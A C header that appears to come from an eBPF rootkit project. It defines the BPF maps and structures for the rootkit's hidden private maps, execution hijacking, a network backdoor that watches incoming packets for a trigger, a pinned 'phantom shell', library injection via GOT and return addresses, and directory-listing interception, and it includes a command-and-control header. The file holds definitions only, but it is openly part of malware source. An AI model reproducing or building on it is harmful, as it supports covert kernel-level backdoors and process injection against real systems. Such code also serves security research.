#ifndef __BPF_MAP_DEFS_H
#define __BPF_MAP_DEFS_H

#ifndef __H_TCKIT
#include "headervmlinux.h"
#else
struct linux_dirent64 {
	long long d_ino;
	unsigned long long d_off;
	short unsigned int d_reclen;
	unsigned char d_type;
	char d_name[0];
};
#endif
#include "../../../common/c&c.h"

//Tasks and comms
#define TASK_COMM_LEN 16


/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rookit

//File system data of a running program which opened some fd
#define FS_OPEN_DATA_PROGRAM_NAME_SIZE 16
#define FS_OPEN_DATA_FILENAME_SIZE 16

//Execution hijacking
#define EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN 64

struct fs_open_data{ //Map value
	char* buf;
	int fd;
	__u32 pid;
	char program_name[FS_OPEN_DATA_PROGRAM_NAME_SIZE];
	char filename[FS_OPEN_DATA_FILENAME_SIZE];
	int is_sudo;
};

struct exec_var_hijack_active_data{//Map value
	__u32 pid;
	int hijack_state;
	char argv0[EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN];
};

//Map value, contains 3 last packets from an specific IP (the key)
struct backdoor_packet_log_data_32{
	int last_packet_modified;
	struct trigger_32_t trigger_array[3];
};
//Map value, contains 6 last packets from an specific IP (the key)
struct backdoor_packet_log_data_16{
	int last_packet_modified;
	struct trigger_16_t trigger_array[6];
};

//Map value, contains data of phantom shell, if active
//In struct_common.h, it is used from userspace and kernel many times, so moved there

struct inj_ret_address_data{ //Map value
	__u64 libc_syscall_address;
	__u64 stack_ret_address;
	__u64 relro_active;
	__u64 got_address;
	__s32 got_offset;
	__s32 padding;
};


//Map value, stores last dirent info of directory by process
struct fs_dir_log_data{
	struct linux_dirent64 dirent_info;
};

struct fs_priv_open{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_open_data);
} fs_open SEC(".maps");

struct exec_var_priv_hijack_active{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__type(key, __u64);
	__type(value, struct exec_var_hijack_active_data);
} exec_var_hijack_active SEC(".maps");

//Map to store log of packets received seeking to find a V3 backdoor trigger
struct backdoor_priv_packet_log_32{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32); //Source IPv4 of packet
	__type(value, struct backdoor_packet_log_data_32);
} backdoor_packet_log_32 SEC(".maps");
struct backdoor_priv_packet_log_16{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32); //Source IPv4 of packet
	__type(value, struct backdoor_packet_log_data_16);
} backdoor_packet_log_16 SEC(".maps");


//Map to store state and data of phantom shell
struct backdoor_priv_phantom_shell{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__type(key, __u64); //Just 1
	__type(value, struct backdoor_phantom_shell_data);
	__uint(pinning, LIBBPF_PIN_BY_NAME);
} backdoor_phantom_shell SEC(".maps");


//Return addresses of syscalls in the shared library, for the library injection
struct inj_priv_ret_address{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct inj_ret_address_data);
} inj_ret_address SEC(".maps");


//Stores directories listed by a process, for later processing at its exit
struct fs_priv_dir_log{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_dir_log_data);
} fs_dir_log SEC(".maps");


#endif